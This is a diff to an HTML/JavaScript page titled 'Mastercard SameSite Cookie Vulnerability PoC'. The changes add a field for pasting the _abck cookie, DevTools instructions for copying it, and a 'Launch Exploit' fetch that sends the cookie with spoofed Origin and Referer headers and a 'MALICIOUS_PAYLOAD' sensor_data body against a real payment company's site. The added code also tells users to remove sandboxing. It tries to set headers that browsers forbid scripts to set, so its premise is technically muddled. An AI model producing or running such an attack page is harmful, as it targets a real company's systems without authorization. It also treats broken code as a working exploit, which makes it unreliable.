@@ -2,6 +2,7 @@
 <html>
 <head>
     <title>Mastercard SameSite Cookie Vulnerability PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -9,6 +10,13 @@
             margin: 0;
             padding: 20px;
             background-color: #f5f5f5;
+        }
+        .version {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            font-size: 12px;
+            color: #888;
         }
         .container {
             max-width: 800px;
@@ -68,10 +76,18 @@
             padding: 10px;
             border-radius: 4px;
             overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        #manual-cookie-input {
+            width: 100%;
+            margin: 10px 0;
+            padding: 5px;
         }
     </style>
 </head>
 <body>
+    <div class="version">v1.2.0</div>
     <div class="container">
         <h1>Mastercard SameSite Cookie Vulnerability PoC</h1>
         
@@ -80,6 +96,10 @@
         <div class="cookie-list" id="cookie-display">
             <h3>Current Browser Cookies:</h3>
             <p id="cookie-status">Checking for cookies...</p>
+            
+            <h4>Manual Cookie Input</h4>
+            <input type="text" id="manual-cookie-input" placeholder="Paste your _abck cookie here (e.g., _abck=1234...)">
+            <button id="manual-cookie-btn">Check Manual Cookie</button>
         </div>
         
         <div>
@@ -95,16 +115,43 @@
         <h3>Instructions:</h3>
         <ol>
             <li>Visit <a href="https://www.mastercard.us" target="_blank">www.mastercard.us</a> to get cookies.</li>
-            <li>Return to this page and use the buttons.</li>
-            <li>Check browser DevTools (F12) Network tab for details.</li>
+            <li>Open DevTools (F12) and go to the Application/Storage tab.</li>
+            <li>Find the _abck cookie and copy its value.</li>
+            <li>Paste the cookie value in the input field above.</li>
+            <li>Click "Check Manual Cookie" or "Launch Exploit".</li>
         </ol>
     </div>
     
     <script>
+        // Global variable to store manually input cookie
+        let manualCookie = '';
+
         // Enhanced cookie detection
         function checkForMastercardCookies() {
             const cookieDisplay = document.getElementById('cookie-status');
-            const cookies = document.cookie;
+            
+            // First, check manually input cookie
+            if (manualCookie) {
+                cookieDisplay.innerHTML = `
+                    <span class="success">✓ Manual Mastercard cookie found!</span><br>
+                    <pre>${manualCookie}</pre>
+                `;
+                return true;
+            }
+
+            // Attempt to read cookies with fallback
+            let cookies = '';
+            try {
+                cookies = document.cookie || '';
+            } catch (e) {
+                cookieDisplay.innerHTML = `
+                    <span class="error">✗ Cannot read cookies automatically:
+                    ${e.message}
+                    
+                    Please manually input the _abck cookie.</span>
+                `;
+                return false;
+            }
             
             // Comprehensive list of potential Mastercard-related cookie patterns
             const mastercardCookiePatterns = [
@@ -136,7 +183,9 @@
                     - Not on Mastercard domain
                     - Cookies blocked
                     - Different cookie naming
-                    </span>
+                    - Sandboxing restrictions
+                    
+                    Please manually input the _abck cookie.</span>
                 `;
                 return false;
             }
@@ -147,45 +196,42 @@
             const results = document.getElementById('results');
             results.innerHTML = '<h3>Detailed Cookie Debugging</h3>';
             
-            // Browser cookie capabilities
+            // Browser information
             results.innerHTML += `
                 <p><strong>Browser Cookie Information:</strong></p>
                 <pre>
-- All Cookies: ${document.cookie}
 - Cookies Enabled: ${navigator.cookieEnabled}
-- Cookie Size: ${document.cookie.length} bytes
+- Sandboxed: ${window.origin === 'null'}
+- Manual Cookie: ${manualCookie ? 'Provided' : 'Not Provided'}
                 </pre>
             `;
             
-            // Try to log cookies with different methods
+            // Attempt to get cookies
             try {
-                console.log("All Cookies via console:", document.cookie);
+                const cookies = document.cookie || 'No cookies accessible';
+                results.innerHTML += `
+                    <p><strong>Accessible Cookies:</strong></p>
+                    <pre>${cookies}</pre>
+                `;
             } catch (e) {
-                results.innerHTML += `<p class="error">Console logging failed: ${e.message}</p>`;
+                results.innerHTML += `
+                    <p class="error">Cookie Access Error: ${e.message}</p>
+                    <p>This is likely due to sandboxing restrictions.</p>
+                `;
             }
             
-            // Check for domain-specific cookies
-            const domains = [
-                'mastercard.us', 
-                '.mastercard.us', 
-                'www.mastercard.us'
-            ];
-            
-            results.innerHTML += '<p><strong>Domain-Specific Cookie Check:</strong></p>';
-            domains.forEach(domain => {
-                // Simulate checking cookies for specific domains
-                const domainCookies = document.cookie.split(';')
-                    .filter(cookie => cookie.includes(domain));
-                
-                results.innerHTML += `
-                    <pre>Cookies for ${domain}: 
-${domainCookies.length > 0 ? domainCookies.join('\n') : 'No cookies found'}
-                    </pre>
-                `;
-            });
+            // Additional browser context
+            results.innerHTML += `
+                <p><strong>Browser Context:</strong></p>
+                <pre>
+- User Agent: ${navigator.userAgent}
+- Origin: ${window.origin}
+- Protocol: ${window.location.protocol}
+                </pre>
+            `;
         }
         
-        // Exploit function (minimal changes from previous version)
+        // Exploit function
         function runExploit() {
             const results = document.getElementById('results');
             results.innerHTML = '<h3>Exploit Results:</h3>';
@@ -195,7 +241,21 @@ ${domainCookies.length > 0 ? domainCookies.join('\n') : 'No cookies found'}
                 results.innerHTML += `<p class="${className}">${text}</p>`;
             }
             
+            // Validate cookie
+            const cookieToUse = manualCookie || document.cookie;
+            if (!cookieToUse) {
+                logResult('<strong>ERROR:</strong> No cookie provided for exploit.', true);
+                return;
+            }
+            
             logResult('Starting exploit...');
+            
+            // Provide clear warning about sandboxing
+            if (window.origin === 'null') {
+                logResult('<strong>WARNING:</strong> This page is sandboxed, which may prevent cookie transmission.', true);
+                logResult('To properly test, remove sandboxing or use an unsandboxed environment.', true);
+                return;
+            }
             
             const startTime = new Date();
             
@@ -206,7 +266,8 @@ ${domainCookies.length > 0 ? domainCookies.join('\n') : 'No cookies found'}
                 headers: {
                     'Content-Type': 'text/plain;charset=UTF-8',
                     'Origin': 'https://www.mastercard.us',
-                    'Referer': 'https://www.mastercard.us/en-us.html'
+                    'Referer': 'https://www.mastercard.us/en-us.html',
+                    'Cookie': cookieToUse
                 },
                 body: JSON.stringify({
                     "sensor_data": "3;0;1;0;3228216;F5auiXJCGhL6K6YEVlXZhVaPFLYjMODKo3mFc5lOuQc=;MALICIOUS_PAYLOAD"
@@ -235,6 +296,15 @@ ${domainCookies.length > 0 ? domainCookies.join('\n') : 'No cookies found'}
         
         // Initialize event listeners
         window.onload = function() {
+            // Manual cookie input
+            const manualCookieInput = document.getElementById('manual-cookie-input');
+            const manualCookieBtn = document.getElementById('manual-cookie-btn');
+            
+            manualCookieBtn.addEventListener('click', function() {
+                manualCookie = manualCookieInput.value.trim();
+                checkForMastercardCookies();
+            });
+            
             // Initial cookie check
             checkForMastercardCookies();
             
@@ -245,7 +315,7 @@ ${domainCookies.length > 0 ? domainCookies.join('\n') : 'No cookies found'}
                 } else {
                     const results = document.getElementById('results');
                     results.innerHTML = '<h3>Exploit Results:</h3>';
-                    results.innerHTML += '<p class="error">No Mastercard cookies found. Visit mastercard.us first!</p>';
+                    results.innerHTML += '<p class="error">No Mastercard cookies found. Paste a cookie first!</p>';
                 }
             });
             
